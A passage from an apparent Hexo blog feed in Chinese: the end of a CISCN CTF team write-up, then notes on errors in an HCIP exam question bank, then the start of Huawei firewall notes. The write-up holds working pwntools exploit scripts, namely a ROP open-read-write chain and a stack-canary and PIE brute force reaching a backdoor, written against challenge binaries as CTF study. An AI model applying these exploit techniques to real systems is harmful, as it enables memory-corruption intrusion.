number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token comment">#integer overflow</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1000000'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token comment">#rop orw</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'./flag\x00\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="funcanary："><a href="#funcanary：" class="headerlink" title="funcanary：()"></a>funcanary：()</h4><p>简单栈溢出，只不过在栈上放了canary，分析发现存在后门函数backdoor，同时main函数是while(1)循环，这就使得我们输入canary失败时仍然能回到main函数，因此可以通过爆破泄露出canary的内容(8位canary，爆破七次)。程序开启了pie，因此需要爆破后门函数的地址,发现后三位不变，爆破倒数第四位。</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./funcanary'</span><span class="token punctuation">)</span><span class="token comment"># io = remote('', '')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn123'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>        <span class="token comment">#输入了正确的canary，返回</span>        <span class="token keyword">if</span> <span class="token string">b'have fun'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>            canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">break</span>backdoor <span class="token operator">=</span> <span class="token number">0x1229</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    addr <span class="token operator">=</span> k <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">2</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x31'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'flag&#123;'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="babyRE："><a href="#babyRE：" class="headerlink" title="babyRE："></a>babyRE：</h4><p>下载文件之后发现是Snap的程序，找到他的官网<a href="https://snap.berkeley.edu/snap/snap.html#%E5%9C%A8%E7%BA%BF%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%BA%9B%E5%8F%98%E9%87%8F%E5%92%8C%E5%87%BD%E6%95%B0%E5%91%BD%E5%90%8D%E4%B8%8D%E8%A7%84%E8%8C%83%EF%BC%8C%E5%B0%86%E5%85%B6%E8%A7%84%E8%8C%83%E5%8C%96%EF%BC%8C%E5%8F%91%E7%8E%B0">https://snap.berkeley.edu/snap/snap.html#在线导入文件，发现有些变量和函数命名不规范，将其规范化，发现</a></p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135150.png" style="zoom:67%;" /><p>此为初始化函数，相当于初始化数组，后发现</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135240.png" style="zoom: 67%;" /><p>将输入的字符第一个与前一个进行^ 操作，第二个与第一个进行^ 以此类推.</p><p>编写脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>str1 <span class="token operator">=</span> <span class="token string">'f'</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            str1 <span class="token operator">=</span> str1 <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><blockquote><p> flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DebuGGerrr-战队WRITEUP&quot;&gt;&lt;a href=&quot;#DebuGGerrr-战队WRITEUP&quot; class=&quot;headerlink&quot; title=&quot;DebuGGerrr 战队WRITEUP&quot;&gt;&lt;/a&gt;DebuGGerrr 战队WRITEUP&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/categories/CTF/"/>
    
    
    <category term="CISCN" scheme="https://shierjinghuang.github.io/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>HCIP问题汇总</title>
    <link href="https://shierjinghuang.github.io/2023/05/20/HCIP%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2023/05/20/HCIP%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</id>
    <published>2023-05-20T00:32:31.000Z</published>
    <updated>2023-05-20T13:09:11.378Z</updated>
    
    <content type="html"><![CDATA[<p><font color="red"><strong>6 .某企业大楼有大量员工，通常都在上班时在大厅开始接入到公司得WLAN网络，随着每位员工走到各自得工位过程中，每个人得移动端叶通过漫游的方式漫游到各自的网络覆盖区域。为了尽量保证每个终端IP地址是固定的，建议的做法是？ (B)</strong></font></p><pre class="line-numbers language-none"><code class="language-none">A.不配置VLAN POOL为每个移动终端配置静态的IP地址      B.配置VLAN POOL并配置Hash算法C.配置VLAN POOL并配置倾序算法 D.配置VLAN POOL任意配置算法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>6题及52题答案错误</strong>，解析：VLAN分配算法为Hash时，VLAN POOL根据STP的MAC地址进行哈希运算后的结果为stp分配业务VLAN，只要配置VLAN POOL里面的VLAN不发生变化，通常STP都会获取到固定的业务VLAN，STP重新上线时也会被优先分配到之前使用过的IP地址</p><p><strong><font color="red">17 . 配置双链路热备时,工程师配置的CAPWAP心跳检测的间隔时间为20秒,并且使能双链路备份功能,则AP检测到主链路超时进行主备切换的时间为(C)?</font></strong> </p><pre class="line-numbers language-none"><code class="language-none">A.75秒B.20秒C.60秒D.90秒<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>17题及63题答案错误</strong>，解析： 缺省情况下，CAPWAP心跳检测的间隔时间为25秒，心跳检测报文次数为6。如果开启了双链路备份功能，则缺省情况下，CAPWAP心跳检测的间隔时间为25秒，心跳检测报文次数为3。本题中时间为20秒且配置CAPWAP,故时间为60秒</p><p><strong>30及76题缺少图片可见356题，答案正确</strong></p><p><strong><font color="red">42 .在WLAN网络中使能HSB备份组时，若AP在主AC上线之后，再在备AC上离线添加AP信息，则备AC上的AP状态会显示为fault(A)</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A.TRUEB.FALSE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>42题901题980题相同，但答案不统一，应该是42题错误</strong>，解析：没啥好说的一套题目里关于这道题有两个答案也是离谱，42题答案B，901,980两题答案为A</p><p><strong>80缺少图片，82与382一致，但缺少图片，89题缺少图片，但不影响做题，93,95完全没有图片</strong></p><p><strong><font color="red">109 .USG防火墙中新建安全区域时，缺省的安全优先级是以下哪一项?</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、安全优先级是100B、安全优先级是5C、安全优先级是85D、安全优先级是50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ABCD全错，答案选E，解析：新建安全区域时，如果不设置安全优先级，则安全优先级为空 </p><p><strong><font color="red">113 .使用 default-route-advertise命令可将缺省路由通告进OSPF域内，该缺省路由属于以下哪一类LSA？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、 2类LSAB、 1类LSAC、 3类LSAD、 4类LSA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ABCD全错，答案选E，解析：这个题应该是5类LSA，四个选项中都没有….</p><p>133与525为题目使用图相同，525题有图，但是525答案错误</p><p><strong><font color="red">244 .在BGP4+中，Update报文中的MIP_REACH_NLRI属性携带的next hop network address字段内容是?</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、只能是链路本地地址B、可以只是链路本地地址C、只能是全球单播地址D、可以同时携带连路本地地址、全球单播地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>244题与12-831中同一题目答案不同：</strong>本题中答案为只能为全球单播地址，而831中同一题目答案为可以同时携带连路本地地址、全球单播地址</p><p>278,279缺少图片</p><p><strong><font color="red">308 .以下关于静态NAT的描述，错误的是哪一项？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A.使用静态NAT时，每一个私有地址有与之对应并且固定的公有地址B.使用静态NAT，在外部网络访问内部时，其报文中携带的公有地址（目的地址）也会被AT设备转换成对应的私有地址C.静态NAT私有地址和公有地址之间的关系是一对一的D.静态NAT能够对私有地址的端口号映射为公有地址的不同端口号，如私有地址的TCP23端口可以转换为公有地址的TCP-20320端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>308题错误，答案选C，但是静态NAT确实是一对一的，D项能进行端口映射的是NAPT….</p><p><strong><font color="red">338 .两台VRRP路由器组成了VRID为2的备份组，并配置虚拟IP地址为2001：1，那么该备份组的虚拟AC地址是以下哪一个？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、00-00-5E-00-01-02B、00-00-5E-00-02-01C、00-00-5E-00-02-02D、00-00-5E-00-01-01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>338题错误，题库答案为A项，但是A项错误，虚拟路由器根据虚拟路由器ID生成的MAC地址。一个虚拟路由器拥有一个虚拟MAC地址，格式为：00-00-5E-00-01-{VRID}(VRRP for IPv4)；00-00-5E-00-02-{VRID}(VRRP for IPv6)，虚拟IP地址为2001：1所以这个是IPV6地址，答案应该是00-00-5E-00-02-02</p><p><strong><font color="red">340 .以下关于OSPF特殊区域的描述，错误的是哪一项？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、Totally Stub区域的作用是允许ABR发布3类LSA缺省路由，不允许存在自治系统外部路由和区域间的路由B、NSSA区域和Stub区域的不同在于NSSA区域允许自治系统外部路由的引入，由ASBR发布7类LSA通告给本区域C、Stub区域和NSSA区域的不同在于Stub区域不允许存在明细域间路由D、Stub区域和Totally Stub区域的不同在于Stub区域允许存在明细域间路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>题库答案为B项，<strong>解析：NSSA 区域是允许引入外部路由的，但是引入外部路由只能由 ASBR 来实现，外部路由以7类lsa的形式传递 ，所以B项正确，CD两项明显矛盾， Totally Stub区域 不允许存在明细域间路由，而Stub区域和NSSA区域允许存在明细域间路由</strong>，故选择C</p><p>365 完全没图片</p><p><strong><font color="red">386 .以下哪一项不属于OSI网络管理模型？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、组织架构模型B、管理模型C、通信模型D、功能模型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>386题错误 答案应为管理模型</strong>，解析：OSI网络管理模型由四个主要的模型组成 ， 组织结构模型 ，信息模型，通信模型，功能模型</p><p>397 完全没图</p><p><font color="blue">508 不确定答案是否正确</font></p><p>513 .如图所示是一个IP报文头部,则以下说法正确的是?（）</p><p><img src="http://edu.ibossay.com/data/upload/2022/0810/15/62f35b6aee886/word/media/image13.png"></p><pre class="line-numbers language-none"><code class="language-none">A、协议号51,代表该IPHeader后的报文为AH头部B、协议号51,代表该IPHeader后的报文为AH头部C、协议号51,代表该IPHeader后的报文为AH头部D、该报文为lpsec VPN报文,并且该报文的数据部分被加密了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>513题 ABC选项相同</strong>，A项确实正确，但是BC与A相同……..</p><p><strong><font color="red">525 .如图所示，R1和R2在一个VRRP备份组中，若R1主动放弃Master角色，则R2会进行以下哪一动作？</font></strong></p><img src="http://edu.ibossay.com/data/upload/2022/0810/15/62f35b6aee886/word/media/image25.png" alt="image25.png" style="zoom: 50%;" /><pre class="line-numbers language-none"><code class="language-none">A、约0.22秒后切换为Master设备B、约0.61秒后切换为Master设备C、立即切换为Master设备 D、约3.61秒后切换为Master设备<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>当Master设备主动放弃Master地位（如Master设备退出备份组）时，</strong>会发送优先级为0的通告报文，用来使Backup设备快速切换成Master设备，而不用等到Master_Down_Interval定时器超时。这个切换的时间称为Skew time，计算方式为：（256－Backup设备的优先级）/256，单位为秒。</p><p><strong>当Master设备发生网络故障而不能发送通告报文的时候，</strong>Backup设备并不能立即知道其工作状况。等到Master_Down_Interval定时器超时后，才会认为Master设备无法正常工作，从而将状态切换为Master。其中，Master_Down_Interval定时器取值为：3×Advertisement_Interval＋Skew_time，单位为秒。</p><p><strong>本套题目中还有一道，不过那个是R1故障，应为3.61秒，题库中两题答案均为3.61，应为答案错误</strong></p><p><strong><font color="red">526 .如图所示，四台交换机已运行并配置了MSTP协议，其中SW2为Instance 20的根桥，Instance 10的备份根桥，那么在R2上通过display stp brief命令可显示以下哪一结果</font></strong></p><img src="http://edu.ibossay.com/data/upload/2022/0810/15/62f35b6aee886/word/media/image26.png" style="zoom: 50%;" /><pre class="line-numbers language-none"><code class="language-none">A、结果3B、结果2C、结果1D、结果4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**<font color=",">526题答案错误，参考答案为C结果1，应为结果2</font>**，SW2为Instance 20的根桥，故Instance 20上应全部为指定接口，仅有结果2满足条件</p><p>644及748完全没图片，672与819为相同题目，图片见819，答案没错<del>（应该）</del></p><p><strong><font color="red">703 .以下关于BGP中Originator_ID属性的描述，正确的是哪些项？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、若AS内存在多个RR.则Originator_ID属性由第一个RR创建B、Originator_ID属于公认任意属性C、当其他BGP Speaker接收到这条路由的时候，将比较收到的Originator_ID和本地的Router ID.如果两个ID相同，BGP Speaker会忽略掉这条路由，不做处理D、当一条路由第一次被RR反射的时候，RR将Originator_ID属性加入这条路由、标识这条路由的发起路由器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>答案CD，但703题A项也正确符合定义….</p><p><strong>719题 .ACE…..</strong></p><p><strong><font color="red">792 .下面对于DR/BDR的理解,错误的是:</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、DR other监听的网络地址为2240.0.6B、在广播网络中,必须选举DR和BDR.没有DR或BDR中的任何一个,广播网络都不能正常工作C、DR other监听的组播地址力224.0.0.5D、所有DR other只与DR和BDR建立邻接关系<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>题目792与816题干相同，选项不同，792题选项为邻接关系，816题为邻居关系，题库给的答案均为ABD,但是 所有的DR other路由器均只与DR和BDR建立邻接关系，DR other间不建立全毗邻邻接关系，答案应为792-AB与816-ABD</strong></p><p><font color="blue">867与946 这个题干跟定义有一定矛盾？ <del>最短路径树SPT（Short Path Tree）是网络的源点到所有结点的最短路径构成的树</del></font></p><p>1109完全没图，以及填空中包括1129,1131,1138,1139,1140,1142,1144,1145,1161,1163,1167,1170,1174,1175,1177,1178总计16道题目缺少图片</p><h3><center>HCIP-Datacom-AD H12-831</center></h3>**<font color="blue">23 .BGP4+中为了发布IPv6路由,Update中新增了什么字段</font>**<pre class="line-numbers language-none"><code class="language-none">A、一个新的NLRI类型,IPv6_NLR,其中携带IPv6 NLRl prefix length和IPv6 NLRl prefixB、一个新的路径属性:MP_UNREACH_NLRlC、 一个新的路径属性:MP_REACH_NLRID、 —个新的路径属性:IPv6_REACH_NLRI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本题可能需要多选，BGP4+为支持IPv6新增了2字段，MP_REACH_NLRI字段和MP_UNREACH_NLRI字段，此题我觉得选择BC</p><p><strong><font color="red">123 .通过SSH终端查看debug 输出的过程中，弹出的信息非常多，下列哪些操作能够使Monitor 终端不再弹出debug消息？</font></strong></p><pre class="line-numbers language-none"><code class="language-none">A、退出当前Monitor 界面，重新SSH登录设备打开新的Monitor界面B、打开记事本，输入undo debugging all 复制该行命令粘贴到Monitor 界面C、打开记事本，输入undo terminal monitor，复制该行命令；粘贴到Monitor界面D、打开记事本，输入undo terminal debugging，复制该行命令，粘贴到Monitor 界面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>123，127，172，176，272，289六个题一样的题干，不一样的答案，三个单选均单选C项，多选题的三道则都是选择了其中三项……</p><p><strong>205题，230题，452题，462，463，487题不对图</strong></p><p>225 题BCD三项选项一致，答案单选D</p><p><font color="red">393，405，428，440四个多选题干和选项互相矛盾，个人理解四个全错</font></p><p><strong><font color="red">511 .同一台路由器的不同ISIS进程之间链路状态值息就认是隔离的 </font></strong></p><blockquote><p>511，559，585 三道一模一样的判断，两道认为答案正确两道认为答案错误</p></blockquote><p><strong><font color="blue">351，391，426题干不完整</font></strong></p><p>以及 填空统一没图 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;font color=&quot;red&quot;&gt;&lt;strong&gt;6 .某企业大楼有大量员工，通常都在上班时在大厅开始接入到公司得WLAN网络，随着每位员工走到各自得工位过程中，每个人得移动端叶通过漫游的方式漫游到各自的网络覆盖区域。为了尽量保证每个终端IP地址是固定的，建议的做法是？ </summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
  </entry>
  
  <entry>
    <title>华为防火墙安全技术概要</title>
    <link href="https://shierjinghuang.github.io/2023/04/16/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/"/>
    <id>https://shierjinghuang.github.io/2023/04/16/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/</id>
    <published>2023-04-16T08:32:31.000Z</published>
    <updated>2023-04-18T06:42:23.558Z</updated>
    
    <content type="html"><![CDATA[<h2 id="华为防火墙技术概述"><a href="#华为防火墙技术概述" class="headerlink" title="华为防火墙技术概述"></a>华为防火墙技术概述</h2><p>[TOC]</p><h3 id="防火墙概述"><a href="#防火墙概述" class="headerlink" title="防火墙概述"></a>防火墙概述</h3><blockquote><p><font color="blue">防火墙是一种安全设备。用于保护一个网络区域免受来自另一个网络区域的攻击和入侵，通常被应用于网络边界</font></p></blockquote><ul><li><p>防火墙根据设备形态分为，<strong>框式防火墙</strong>、<strong>盒式防火墙</strong>和<strong>软件防火墙</strong></p></li><li><p><font color="FF6300">防火墙作用是<strong>流量控制</strong>和<strong>安全防护</strong>，<strong>区分和隔离不同安全区域</strong></font></p></li></ul><p>防火墙的转发流程比路由器复杂。以框式设备为例，硬件上除了接口、LPU  <code>Line Processing Unit</code>、交换网板等外，防火墙还特有SPU Service Processing Unit，用于实现防火墙的安全功能</p><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/防火墙转发流程.png" style="zoom: 50%;" /><center>防火墙转发流程</center>#### 防火墙的典型应用场景<img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/应用场景.png" style="zoom: 33%;" /><center>四种不同场景下的防火墙应用</center>>DMZ非军事区 Demilitarized Zone,是介于严格的军事管制区和松散的公共区域之间的一种有着部分管制的区域。防火墙设备借用了这一术语，指代一个逻辑上和物理上都与内部网络和外部网络分离的安全区域，在企业中一般用于服务器的放置。<blockquote><p>数据中心网络一般采用Spine-Leaf架构。Spine为骨干节点负责流量高速转发，Leaf为叶子节点负责服务器、防火墙或其他设备接入。Spine-Leaf之间全三层互联</p></blockquote><h4 id="防火墙介绍："><a href="#防火墙介绍：" class="headerlink" title="防火墙介绍："></a>防火墙介绍：</h4><ul><li>防火墙从包过滤防火墙发展起经历了状态检测、统一威胁管理、NGFW等到AI防火墙，有以下特点：<ul><li>访问控制越来越精细</li><li>防护能力越来越强</li><li>性能越来越高</li></ul></li></ul><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/防火墙发展历程.png" style="zoom: 33%;" /><h5 id="包过滤防火墙"><a href="#包过滤防火墙" class="headerlink" title="包过滤防火墙"></a>包过滤防火墙</h5><p><font color="FF3300">包过滤是指基于<strong>五元组</strong>对每个数据包进行检测，根据配置的安全策略转发或丢弃数据包</font></p><p>包过滤防火墙的基本原理是：通过配置<strong>访问控制列表</strong>（Access Control List，ACL）实施数据包的过滤</p><ul><li><p>包过滤防火墙主要基于数据包中的源/目的IP地址、源/目的端口号、IP 标识和报文传递的方向等信息</p></li><li><p>包过滤防火墙的设计简单，非常易于实现，而且价格便宜</p></li><li><p>包过滤防火墙的缺点主要表现以下几点：</p><ul><li>随着ACL复杂度和长度的增加，其过滤性能呈指数下降</li><li>静态的ACL规则难以适应动态的安全要求</li><li>包过滤不检查会话状态也不分析数据，这很容易让黑客蒙混过关。例如，攻击者可以使用假冒地址进行欺骗，通过把自己主机IP地址设成一个合法主机IP地址，就能很轻易地通过报文过滤器。</li></ul></li></ul><h5 id="状态检测防火墙"><a href="#状态检测防火墙" class="headerlink" title="状态检测防火墙"></a>状态检测防火墙</h5><ul><li><font color="FF3300">状态检测考虑报文前后的关联性，检测的是连接状态而非单个报文，状态检测防火墙就是支持状态检测功能的防火墙</font></li></ul><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/状态检查防火墙.png" style="zoom:67%;" /><p><del>NGFW也是状态检测防火墙的一种。NGFW在内容安全和处理性能有极大的提升</del>，此处存疑，下一代防火墙的定义随时代发展定义也在变化，望读者读到自行判断</p><h5 